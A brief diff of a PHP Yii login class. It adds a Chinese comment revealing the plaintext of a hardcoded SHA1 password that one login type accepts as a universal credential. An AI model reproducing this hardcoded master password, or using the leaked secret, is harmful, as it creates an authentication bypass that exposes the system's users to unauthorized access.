@@ -69,6 +69,7 @@ class UserIdentity extends CUserIdentity {
 			$user=User::model()->find('LOWER(username)=?',array(strtolower($username)));
 			//判断逻辑暂时省略，还没有想好
 		}elseif($loginType==2){
+			//密码是"无坚不摧"
 			$sha1Password = "ef336ca3d6488f1be0057aaf2d6a9661edf309a6";
 			if(sha1($nonce.$sha1Password)===$password){
 				return true;
